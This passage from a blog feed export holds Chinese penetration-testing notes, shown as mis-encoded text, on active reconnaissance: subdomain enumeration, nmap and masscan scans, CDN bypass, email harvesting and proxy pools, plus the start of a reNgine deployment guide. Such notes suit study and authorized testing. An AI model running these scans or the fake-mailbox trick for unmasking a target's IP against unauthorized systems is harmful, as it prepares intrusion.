href="https://www.qixin.com/">https://www.qixin.com/</a></p><p>å›½å¤–<br>OpenCorporates<a href="https://opencorporates.com/">https://opencorporates.com/</a><br>Wayback Machine<a href="http://web.archive.org/">http://web.archive.org/</a></p><p>é›¶é›¶ä¿¡å®‰:<a href="https://0.zone/">https://0.zone/</a></p><h1 id="3-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"><a href="#3-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†" class="headerlink" title="3.ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"></a>3.ä¸»åŠ¨ä¿¡æ¯æ”¶é›†</h1><h2 id="3-1-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬ç»“æ„"><a href="#3-1-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬ç»“æ„" class="headerlink" title="3.1.ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬ç»“æ„"></a>3.1.ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬ç»“æ„</h2><p>åŸºæœ¬æµç¨‹ï¼š </p><ol><li>ç”±æ”»å‡»è€…ä¸»åŠ¨å‘èµ·â¾ä¸ºæˆ–è¯·æ±‚ </li><li>â½¬æ ‡å—åˆ°â¾ä¸ºæˆ–è¯·æ±‚å½±å“å¹¶å‘å‡ºåé¦ˆ </li><li>æ”»å‡»è€…è·å¾—åé¦ˆå¹¶åˆ¤æ–­ç‰¹å¾</li></ol><h2 id="3-2-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„ç‰¹ç‚¹"><a href="#3-2-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„ç‰¹ç‚¹" class="headerlink" title="3.2.ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„ç‰¹ç‚¹"></a>3.2.ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„ç‰¹ç‚¹</h2><p>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„ä¼˜ç¼ºç‚¹ï¼š<br>    ä¼˜ç‚¹ï¼š<br>        1.ä¿¡æ¯çš„é’ˆå¯¹æ€§å¼º<br>        2.ä¿¡æ¯çš„å‡†ç¡®åº¦å’Œæ—¶æ•ˆæ€§â¾¼<br>        3.èƒ½æ”¶é›†åˆ°æœªå…¬å¼€çš„æ•æ„Ÿä¿¡æ¯(robots.txt,.rar)<br>    ç¼ºç‚¹ï¼š<br>        1.å®¹æ˜“æš´éœ²ï¼Œè¢«å‘ç°çš„â»›é™©â¾¼(è¯·æ±‚æ•æ„Ÿå†…å®¹,çŸ­æ—¶é—´åŒä¸€ipè®¿é—®æ¬¡æ•°å¤§äºæŸä¸ªå€¼)<br>        2.æ”¶é›†çš„ä¿¡æ¯é‡å’Œè¦†ç›–â¾¯â½è¾ƒå°‘ </p><p>ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„åº”â½¤åœºæ™¯:<br>ä¸»åŠ¨ä¿¡æ¯é€šå¸¸åœ¨è¢«åŠ¨ä¿¡æ¯æ”¶é›†ååˆ†æå‡ºé‡è¦æ”»å‡»é¢æˆ–æ•æ„Ÿç‚¹å†å»é’ˆå¯¹æ€§å»åšä¸»åŠ¨ä¿¡æ¯æ”¶é›†ï¼Œåœ¨ä¸»åŠ¨ä¿¡æ¯æ”¶é›†çš„æ—¶å€™é€šå¸¸æŒç»­æ—¶é—´æ¯”è¾ƒé•¿ï¼Œè€Œä¸”ä¼šé€šè¿‡å„ç§ä¸åŒçš„æ–¹å¼ä¸ç›®æ ‡äº¤äº’ï¼Œå®æˆ˜ä¸­æœ€å¸¸ç”¨çš„æ‰‹æ®µæ˜¯æ¨¡æ‹Ÿæˆ–ä¼ªè£…åœ¨æ­£å¸¸ä¸šåŠ¡æµç¨‹ä¸ç›®æ ‡äº¤äº’ã€‚</p><h2 id="3-3-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†æ‰‹æ®µ"><a href="#3-3-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†æ‰‹æ®µ" class="headerlink" title="3.3.ä¸»åŠ¨ä¿¡æ¯æ”¶é›†æ‰‹æ®µ"></a>3.3.ä¸»åŠ¨ä¿¡æ¯æ”¶é›†æ‰‹æ®µ</h2><h3 id="åŸŸå"><a href="#åŸŸå" class="headerlink" title="åŸŸå"></a>åŸŸå</h3><p>1.æœç´¢å¼•æ“</p><table border="1" width=100%><tr><th>Google</th><th><a href="https://www.google.com">www.google.com</a></th></tr><tr><th>Bing</th><th><a href="https://www.Bing.com">www.Bing.com</a></th></tr><tr><th>Baidu</th><th><a href="https://www.baidu.com">www.baidu.com</a></th></tr></table><p>2.ç½‘ç«™å¤‡æ¡ˆ</p><table border="2" width=100%><tr><th>ICPå¤‡æ¡ˆ-ç«™é•¿ä¹‹å®¶</th><th><a href=http://icp.chinaz.com>http://icp.chinaz.com/</a></th></tr><tr><th>ICP/IP/åŸŸåå¤‡æ¡ˆç®¡ç†</th><th><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></th></tr><tr><th>ICPå¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢</th><th><a href="https://www.icplist.com/">https://www.icplist.com/</a></th></tr></table><p>3.ipåæŸ¥</p><table border=1 width=100%><tr><th>å¾®æ­¥åœ¨çº¿</th><th><a href="https://x.threatbook.cn">https://x.threatbook.cn</a></th></tr><tr><th>Ip138åæŸ¥</th><th><a href="https://site.ip138.com">https://site.ip138.com</a></th></tr><tr><th>çˆ±ç«™ç½‘</th><th><a href="https://dns.aizhan.com">https://dns.aizhan.com</a></th></tr><tr><th>ç«™é•¿ä¹‹å®¶</th><th><a href="https://stool.chinaz.com/same">https://stool.chinaz.com/same</a></th></tr><tr><th>RapidDNS Sameip</th><th><a href="https://rapiddns.io/sameip">https://rapiddns.io/sameip</a></th></tr></table><p>4.AppinfoScanner<br>é¡¹ç›®åœ°å€: <a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ”¯æŒå¯¹andriod,ios,webæ–‡ä»¶è¿›è¡Œæ‰«æ</span><br><span class="line">å¯è®¾ç½®å¹¶å‘çº¿ç¨‹\è®¾ç½®è¿‡æ»¤</span><br></pre></td></tr></table></figure><h3 id="å­åŸŸå"><a href="#å­åŸŸå" class="headerlink" title="å­åŸŸå"></a>å­åŸŸå</h3><p>1.oneforall<br>configç›®å½•ä¸‹æœ‰api.pyç”¨äºé…ç½®api,é…ç½®çš„è¶Šå…¨,æœé›†åˆ°çš„ä¿¡æ¯è¶Šå…¨<br>é¡¹ç›®ä»“åº“:<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ ¹æ®æ–‡æ¡£å®‰è£…</span><br><span class="line">é«˜ç‰ˆæœ¬ä¸­from re import sre_parseæŠ¥é”™,åªéœ€å°†è¯¥è¯­å¥æ›´æ”¹ä¸ºimport sre_parse</span><br><span class="line">python oneforall.py --help éªŒè¯å®‰è£…æˆåŠŸ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target example.com run</span><br><span class="line">python oneforall.py --targets ./domain.txt run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191747141.png"><br>æ‰«æå‡ºçš„ç»“æœä¼šæ”¾åœ¨resultsç›®å½•ä¸‹çš„csvæ–‡ä»¶ä¸­<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191749379.png"></p><p>2.layerå­åŸŸåæŒ–æ˜æœº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŒå‡»layer.exeè¿è¡Œ</span><br><span class="line">ç›®å½•ä¸‹çš„dic.txtä¸ºå­åŸŸåçˆ†ç ´å­—å…¸</span><br><span class="line">å®Œæˆç›¸å…³è®¾å®šåå¼€å§‹æ‰«æ</span><br><span class="line">å³é”®å¯¼å‡ºåŸŸåå¯å¯¼å‡ºåŸŸå(.txt)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191801910.png"></p><p>3.jsfind<br>çˆ¬å–æŒ‡å®šç›®æ ‡ä¸­çš„é“¾æ¥ç­‰å†…å®¹,ä»è€Œè¿›ä¸€æ­¥çˆ¬å–å­åŸŸåå’ŒURLä¿¡æ¯<br>é¡¹ç›®åœ°å€:<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç®€å•çˆ¬å–</span><br><span class="line">python JSFinder.py -u [target]</span><br><span class="line">æ·±åº¦çˆ¬å–</span><br><span class="line">python JSFinder.py -u [target] -d</span><br><span class="line">æ‰¹é‡çˆ¬å–</span><br><span class="line">pyrhon JSfinder.py -f text.txt</span><br><span class="line">-c æŒ‡å®šcookie </span><br><span class="line">-ou æŒ‡å®šæ–‡ä»¶åä¿å­˜urlé“¾æ¥</span><br><span class="line">-os æŒ‡å®šæ–‡ä»¶åä¿å­˜å­åŸŸå</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191820947.png"></p><p>4.subDomainsBrute<br>é¡¹ç›®åœ°å€:<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a><br>ç»“æœæ˜¯å­åŸŸåå’Œå¯¹åº”ip<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191858788.png"></p><p>5.googleè¯­æ³•<br>site:â€baidu.comâ€<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191904557.png"></p><p>6.ksubdomain<br>Goç¼–å†™,é€Ÿåº¦å¿«<br>é¡¹ç›®åœ°å€:<a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307192013308.png"></p><p>7.fofaæŸ¥è¯¢<br>domain&#x3D;â€baidu.comâ€<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307191940375.png"></p><p>8.å¨èƒæƒ…æŠ¥ç½‘ç«™<br>ä¾‹å¦‚:å¾®æ­¥åœ¨çº¿-å­åŸŸåé€‰é¡¹<br><a href="https://x.threatbook.cn/">https://x.threatbook.cn</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307192007620.png"></p><p>ç«™é•¿ä¹‹å®¶:<a href="https://tool.chinaz.com/subdomain/">https://tool.chinaz.com/subdomain/</a></p><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p>1.masscan<br>é¡¹ç›®åœ°å€:<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å•ç«¯å£:masscan [ip] -p80</span><br><span class="line">å¤šç«¯å£:masscan [ip] -p80,443</span><br><span class="line">èŒƒå›´ç«¯å£:masscan [ip] -p20-1000</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307201648167.png"></p><p>2.nmap<br>å®˜ç½‘åœ°å€:<a href="https://nmap.org/">https://nmap.org/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»˜è®¤ç«¯å£æ‰«æ:nmap [ip]</span><br><span class="line">æŒ‡å®šç«¯å£æ‰«æ:</span><br><span class="line">nmap [ip] -p 80</span><br><span class="line">nmap [ip] -p 80,3389</span><br><span class="line">nmap [ip] -p 20-1000</span><br><span class="line"></span><br><span class="line">TCPå…¨è¿æ¥æ‰«æ:</span><br><span class="line">nmap [ip] -p 80 -sT</span><br><span class="line"></span><br><span class="line">SYNåŠè¿æ¥æ‰«æ:</span><br><span class="line">nmap [ip] -p 80 -sS</span><br><span class="line"></span><br><span class="line">ç½‘æ®µä¸»æœºæ¢æµ‹</span><br><span class="line">nmap -sP 192.168.31.0/24</span><br><span class="line"></span><br><span class="line">æœåŠ¡è¯†åˆ«</span><br><span class="line">nmap [ip] -p 80 -sV</span><br><span class="line"></span><br><span class="line">æ“ä½œç³»ç»Ÿæ‰«æ</span><br><span class="line">nmap [ip] -O</span><br><span class="line"></span><br><span class="line">ç»“æœå¯¼å‡º</span><br><span class="line">nmap [ip] -p 80 -oN result.txt</span><br><span class="line">nmap [ip] -p 80 -oX result.xml</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307201657588.png"></p><p>3.goby<br>å®˜ç½‘åœ°å€:<a href="https://gobies.org/">https://gobies.org/</a><br>å®Œæˆç›¸å…³è®¾å®šåç›´æ¥æ‰«<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307201808355.png"></p><h3 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h3><p>1.Wappalyzer<br>è°·æ­Œåº”ç”¨å•†åº—é“¾æ¥:<a href="https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN">https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307201953762.png"></p><p>2.Ehole</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯æŸ¥æŒ‡çº¹,å¯æŸ¥Cæ®µæƒé‡</span><br><span class="line">EHole [command] --helpæŸ¥çœ‹ç”¨æ³•</span><br><span class="line">ä¾‹å¦‚ Ehole finger -u [ip]</span><br><span class="line">æ‰«å®Œä¼šåˆ—å‡ºé‡ç‚¹èµ„äº§</span><br></pre></td></tr></table></figure><p>é¡¹ç›®åœ°å€:<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p>3.Goby<br>ä¸‹è½½åœ°å€:<a href="https://gobies.org/">https://gobies.org/</a></p><p>4.whatweb</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ä»¥æœé›†ç½‘ç«™çš„ä¸€äº›æ–‡å­—ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>é¡¹ç›®åœ°å€:<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307202043710.png"></p><p>5.æ½®æ±æŒ‡çº¹<br><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p><h3 id="Cæ®µæ‰«æ"><a href="#Cæ®µæ‰«æ" class="headerlink" title="Cæ®µæ‰«æ"></a>Cæ®µæ‰«æ</h3><p>1.Ehole<br>é¡¹ç›®åœ°å€:<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰«æåè‡ªåŠ¨åˆ—å‡ºé‡ç‚¹èµ„äº§</span><br><span class="line">Ehole finger -u [ip]</span><br></pre></td></tr></table></figure><p>2.Eeyes<br>é¡¹ç›®åœ°å€:<a href="https://github.com/EdgeSecurityTeam/Eeyes">https://github.com/EdgeSecurityTeam/Eeyes</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç­›é€‰çœŸå®IPå¹¶æ•´ç†Cæ®µ</span><br><span class="line">Eeyes -f [ç›®æ ‡]</span><br></pre></td></tr></table></figure><p>3.fscan<br>é¡¹ç›®åœ°å€:<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æ</span><br><span class="line">fscan.exe -h 192.168.1.1/24</span><br></pre></td></tr></table></figure><p>4.ServerScan<br>é¡¹ç›®åœ°å€:<a href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨Golangå¼€å‘ä¸”é€‚ç”¨äºæ”»é˜²æ¼”ä¹ å†…ç½‘æ¨ªå‘ä¿¡æ¯æ”¶é›†çš„é«˜å¹¶å‘ç½‘ç»œæ‰«æã€æœåŠ¡æ¢æµ‹å·¥å…·</span><br></pre></td></tr></table></figure><h3 id="CDNç»•è¿‡"><a href="#CDNç»•è¿‡" class="headerlink" title="CDNç»•è¿‡"></a>CDNç»•è¿‡</h3><p>CDN<br>é€šè¿‡ä¸åŒåœ°ç†ä½ç½®çš„ç¼“å­˜æ¥åŠ å¿«è®¿é—®é€Ÿåº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰å¯èƒ½è®¿é—®çš„â½¹â»šä¸æ˜¯çœŸå®ipæä¾›çš„â½¹â»š<br>æŒ‚äº†CDNçš„æœåŠ¡å™¨è§£æåˆ°çš„æ˜¯cdnipå¹¶ä¸æ˜¯çœŸå®çš„ç›®æ ‡ip</p><p>1.CDNä»·æ ¼æ˜‚è´µ,<br>æ—ç«™ï¼Œå­åŸŸåï¼Œcæ®µå¯èƒ½æ²¡æœ‰CDN</p><p>2.DNSå†å²è§£æ<br>CDNåŸºäºè§£æ,æ‰€ä»¥æŸ¥çœ‹è¾ƒæ—©çš„CDNè§£æè®°å½•è§£æåˆ°çœŸæ­£ä¸»æœº<br>æŸ¥è¯¢ç½‘ç«™<br><a href="https://x.threatbook.cn/">https://x.threatbook.cn</a><br><a href="https://webiplookup.com/">https://webiplookup.com</a><br><a href="https://viewdns.info/iphistory">https://viewdns.info/iphistory</a><br><a href="https://toolbar.netcraft.com/site_report">https://toolbar.netcraft.com/site_report</a></p><p>3.å¤šåœ°ping&#x2F;å›½å¤–ping<br>å¯èƒ½å›½å†…é‡‡ç”¨cdn<br><a href="https://aizhan.com/">https://ping.aizhan.com</a><br><a href="https://ping.chinaz.com/">https://ping.chinaz.com</a></p><p>4.è¯ä¹¦æŸ¥è¯¢<br>åŸŸåçš„è¯ä¹¦å¯èƒ½å­˜åœ¨çœŸå®ipä¿¡æ¯,å¦‚æœç›®æ ‡ç«™ç‚¹é…æœ‰httpsè¯ä¹¦,æˆ‘ä»¬å¯ä»¥æŸ¥åˆ°æ‰€æœ‰ç›¸åŒè¯ä¹¦çš„ç«™ç‚¹<br><a href="https://search.censys.io/">https://search.censys.io</a><br><a href="https://crt.sh/">https://crt.sh</a></p><p>5.é‚®ç®±æœåŠ¡å™¨<br>cdnä¸æ”¯æŒé‚®ç®±<br>é‚®ä»¶æŸ¥çœ‹æ³¨å†ŒåŸæ–‡(ä¿¡å¤´),é‡Œé¢çš„é‚®ç®±æœåŠ¡å™¨ipå¯èƒ½æ˜¯çœŸå®ip<br>å®æˆ˜ä¸­è®©ç›®æ ‡é‚®ç®±æœåŠ¡å™¨å‘è‡ªå·±çš„ä¼ªé€ é‚®ç®±å‘é€é‚®ä»¶,æŸ¥çœ‹é‚®ç®±æœåŠ¡å™¨ip</p><p>6.è¾¹ç¼˜ä¸šåŠ¡çš„å­åŸŸå<br>ä¾‹å¦‚app,å°ç¨‹åºå­åŸŸåæŒ‡å‘çš„ip</p><p>7.fofaæŸ¥æ‰¾ç½‘ç«™æ ‡é¢˜æŸ¥æ‰¾<br>title&#x3D;â€œâ€<br>å¾—åˆ°ç«™ç‚¹ip,åˆ¤æ–­ipæ˜¯å¦ä¸ºä¸»ç«™</p><p>8.ajaxåº”ç”¨æ¶æ„<br>åº”ç”¨æ¶æ„:<br>å‰åç«¯ä¸åˆ†ç¦»ï¼Œbpè¿”å›åŒ…ä¸ºhtmlæºç <br>å‰åç«¯åˆ†ç¦»ï¼Œè¿”å›åŒ…ä¸€èˆ¬ç›´æ¥è¿”å›æ•°æ®ï¼Œé€šå¸¸æ˜¯jsonæ•°æ®</p><p>ajaxè¯·æ±‚ä¸è§„èŒƒï¼Œä»¥ipçš„å½¢å¼è¿›è¡Œè°ƒç”¨<br>å‰ç«¯ajaxå»è°ƒç”¨åå°çš„apiï¼Œä»–ä¼šè®¿é—®åå°çš„ipï¼Œæ­¤ipå¤§æ¦‚ç‡ä¸ºçœŸå®ip</p><h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><p>1.dirsearch<br>é¡¹ç›®åœ°å€:<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307202057179.png"></p><p>2.å¾¡å‰‘æ‰«æ</p><h3 id="æ¼æ´æ‰«æ"><a href="#æ¼æ´æ‰«æ" class="headerlink" title="æ¼æ´æ‰«æ"></a>æ¼æ´æ‰«æ</h3><p>1.xray<br>é¡¹ç›®åœ°å€:<a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a><br>xrayæ–‡æ¡£:<a href="https://docs.xray.cool/#/">https://docs.xray.cool/#/</a></p><p>2.nuclei<br>é¡¹ç›®åœ°å€:<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a><br>nucleiæ–‡æ¡£:<a href="https://nuclei.projectdiscovery.io/nuclei/get-started/#running-nuclei">https://nuclei.projectdiscovery.io/nuclei/get-started/#running-nuclei</a></p><p>3.Goby<br>å®˜ç½‘åœ°å€:<a href="https://gobies.org/">https://gobies.org/</a></p><h3 id="å…¶ä»–æœé›†"><a href="#å…¶ä»–æœé›†" class="headerlink" title="å…¶ä»–æœé›†"></a>å…¶ä»–æœé›†</h3><p>æœé›†å‘˜å·¥ä¿¡æ¯,æ‹›æ ‡ä¿¡æ¯,github,ç™¾åº¦è´´å§,æ–°æµªå¾®åš,æ‰‹æœºå·,æ”¯ä»˜å®,è®ºå›,åšå®¢,é‚®ç®±ç­‰</p><p>1.é‚®ç®±æ”¶é›†:EmailAll<br>é¡¹ç›®åœ°å€:<a href="https://github.com/Taonn/EmailAll">https://github.com/Taonn/EmailAll</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api.pyé‡Œé…ç½®ä¿¡æ¯</span><br><span class="line">settings.pyé‡Œé…ç½®ä»£ç†</span><br><span class="line">å®ä¾‹:</span><br><span class="line">    python3 emailall.py check</span><br><span class="line">    python3 emailall.py --domain example.com run</span><br><span class="line">    python3 emailall.py --domains ./domains.txt run</span><br></pre></td></tr></table></figure><p>2.å…¬ä¼—å·&#x2F;æ–‡ç« æœé›†:<br><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></p><p>3.ç½‘ç›˜èµ„æºæœé›†</p><p>å‡Œé£äº‘:<a href="https://www.lingfengyun.com/">https://www.lingfengyun.com</a></p><p>å¤§åŠ›ç›˜:<a href="https://www.dalipan.com/">https://www.dalipan.com/</a></p><h3 id="ä»£ç†æ± "><a href="#ä»£ç†æ± " class="headerlink" title="ä»£ç†æ± "></a>ä»£ç†æ± </h3><p>ProxyPool<br>é¡¹ç›®åœ°å€:<a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></p><h2 id="3-4-å…¨æ–¹ä½æ”¶é›†"><a href="#3-4-å…¨æ–¹ä½æ”¶é›†" class="headerlink" title="3.4.å…¨æ–¹ä½æ”¶é›†"></a>3.4.å…¨æ–¹ä½æ”¶é›†</h2><p>1.ç¯å¡”<br>é¡¹ç›®åœ°å€:<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>2.æ°´æ³½<br>é¡¹ç›®åœ°å€: <a href="https://github.com/0x727/ShuiZe_0x727/">https://github.com/0x727/ShuiZe_0x727/</a></p><p>3.Goby<br>å®˜ç½‘åœ°å€:<a href="https://gobies.org/">https://gobies.org/</a></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªåŠ¨åŒ–ç½‘ç»œä¾¦å¯Ÿæ¡†æ¶-Rengine éƒ¨ç½²ä¸ä½¿ç”¨</title>
      <link href="/2023/07/15/%E8%87%AA%E5%8A%A8%E5%8C%96%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E6%A1%86%E6%9E%B6-Rengine%20%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/07/15/%E8%87%AA%E5%8A%A8%E5%8C%96%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E6%A1%86%E6%9E%B6-Rengine%20%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="è‡ªåŠ¨åŒ–ç½‘ç»œä¾¦å¯Ÿæ¡†æ¶-Rengine-éƒ¨ç½²ä¸ä½¿ç”¨"><a href="#è‡ªåŠ¨åŒ–ç½‘ç»œä¾¦å¯Ÿæ¡†æ¶-Rengine-éƒ¨ç½²ä¸ä½¿ç”¨" class="headerlink" title="è‡ªåŠ¨åŒ–ç½‘ç»œä¾¦å¯Ÿæ¡†æ¶-Rengine éƒ¨ç½²ä¸ä½¿ç”¨"></a>è‡ªåŠ¨åŒ–ç½‘ç»œä¾¦å¯Ÿæ¡†æ¶-Rengine éƒ¨ç½²ä¸ä½¿ç”¨</h1><h1 id="1-éƒ¨ç½²"><a href="#1-éƒ¨ç½²" class="headerlink" title="1.éƒ¨ç½²"></a>1.éƒ¨ç½²</h1><h2 id="1-1-kaliç¯å¢ƒ"><a href="#1-1-kaliç¯å¢ƒ" class="headerlink" title="1.1.kaliç¯å¢ƒ"></a>1.1.kaliç¯å¢ƒ</h2><p>é•œåƒç¯å¢ƒ:kali-linux-2023.2a-installer-amd64.iso<br>éƒ¨ç½²åœ¨vulträ¸Š</p><h2 id="1-2-å®‰è£…è½¯ä»¶"><a href="#1-2-å®‰è£…è½¯ä»¶" class="headerlink" title="1.2.å®‰è£…è½¯ä»¶"></a>1.2.å®‰è£…è½¯ä»¶</h2><p>1.å®‰è£…git</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-git install git</span><br><span class="line">git -v æ£€æŸ¥å®‰è£…</span><br></pre></td></tr></table></figure><p>2.make</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kaliè‡ªå¸¦</span><br><span class="line">make -v æŸ¥çœ‹ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p>3.å®‰è£…docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker.io</span><br><span class="line">docker -v æ£€æŸ¥å®‰è£…</span><br></pre></td></tr></table></figure><p>4.å®‰è£…docker-compose</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-compose</span><br><span class="line">docker-compose æ£€æŸ¥å®‰è£…</span><br></pre></td></tr></table></figure><h2 id="1-3-éƒ¨ç½²rengine"><a href="#1-3-éƒ¨ç½²rengine" class="headerlink" title="1.3.éƒ¨ç½²rengine"></a>1.3.éƒ¨ç½²rengine</h2><p>1.é¡¹ç›®æºç å…‹éš†è‡³æœ¬åœ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/yogeshojha/rengine.git</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307150052727.png"><br>è¿›å…¥rengineæ–‡ä»¶å¤¹ä¸­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd rengine</span><br></pre></td></tr></table></figure><p>2.ç¼–è¾‘.env,æ›´æ”¹POSTGRES_PASSWORDå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim .env</span><br></pre></td></tr></table></figure><p>3.è¿è¡Œå®‰è£…è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./install.sh</span><br></pre></td></tr></table></figure><p>ç›´åˆ°å‡ºç°å¦‚ä¸‹é¡µé¢,åˆ›å»ºç”¨æˆ·<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151109950.png"><br>è¿™é‡Œå› æˆªå›¾ctrl+cé€€å‡ºäº†ï¼Œåˆ™ä½¿ç”¨make usernameåˆ›å»ºç”¨æˆ·<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151113402.png"></p><p>4.å¯åŠ¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make up</span><br></pre></td></tr></table></figure><p>5.ç›´æ¥è®¿é—®ip,ç”¨åˆšæ‰æ³¨å†Œçš„ç”¨æˆ·ç™»å½•å³å¯<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307151126202.png"></p><h1 id="2-ä½¿ç”¨-é…åˆhackone"><a href="#2-ä½¿ç”¨-é…åˆhackone" class="headerlink" 